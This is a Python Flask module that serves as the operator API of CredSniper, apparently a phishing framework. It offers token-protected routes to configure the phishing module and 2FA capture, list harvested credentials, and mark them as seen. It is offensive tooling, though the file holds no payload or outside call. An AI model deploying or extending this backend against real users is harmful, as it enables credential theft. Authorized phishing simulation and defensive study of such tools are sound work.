from flask import jsonify, redirect, request, abort
from core import functions
from hmac import compare_digest

class CredSniperAPI():
    def __init__(self, token):
        self.name = 'api'
        self.api_token = token
        self.module_name = None
        self.enable_2fa = None
        self.creds = None
        self.seen = set()
        self.routes = [
            { 'name': 'config', 'url': '/config' },
            { 'name': 'creds_view', 'url': '/creds/view' },
            { 'name': 'creds_seen', 'url': '/creds/seen/<string:cred_id>' },
            { 'name': 'creds_2fa', 'url': '/creds/2fa/<string:user>/<string:password>' },
        ]


    def authenticate(self, request):
        token = request.args.get('api_token')
        if not token or not compare_digest(token, self.api_token):
            abort(401, {'message': 'Invalid API token'})


    def config(self):
        self.authenticate(request)
        if request.method == 'POST':
            enable_2fa = request.form['enable_2fa']
            set_module = request.form['module']
            set_token = request.form['api_token']

            if enable_2fa:
                self.enable_2fa = True if enable_2fa.lower() == 'true' else False
            if set_module:
                self.module_name = set_module
            if set_token:
                self.api_token = set_token

            return jsonify({'success': True})
        elif request.method == 'GET':
            config = {
                'enable_2fa': self.enable_2fa,
                'module': self.module_name,
                'api_token': self.api_token
            }
            return jsonify(config)


    def creds_view(self):
        self.authenticate(request)
        self.creds = functions.reload_creds(self.seen)
        return jsonify(self.creds)


    def creds_seen(self, cred_id):
        self.authenticate(request)
        self.seen.add(cred_id)
        self.creds = functions.reload_creds(self.seen)
        return jsonify(list(self.seen))


    def creds_2fa(self, user,password):
        self.authenticate(request)
        response = {'success': True,'user': user}
        return jsonify(response)


def load(api_token):
    return CredSniperAPI(api_token)
